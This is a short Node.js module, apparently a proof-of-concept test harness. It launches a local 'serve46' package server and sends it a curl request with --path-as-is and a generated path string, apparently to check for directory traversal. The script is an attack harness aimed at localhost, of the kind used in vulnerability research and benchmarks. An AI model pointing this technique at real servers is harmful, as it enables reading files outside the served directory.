function exploitFunction(payload) {
    const { exec } = require("child_process");
    const sleep = require("sleep");
    const path = require("path");

    let server = "node ./node_modules/serve46/index.js";
    let exe = exec(server, (error, stdout) => {});

    sleep.sleep(2);

    let attack_string = `curl -v --path-as-is "http://127.0.0.1:8888${payload.genstr(50)}`;
    exec(attack_string, (error, stdout) => {
        if (stdout) {
            return stdout;
        }
        return null;
    });
}

module.exports = { exploitFunction };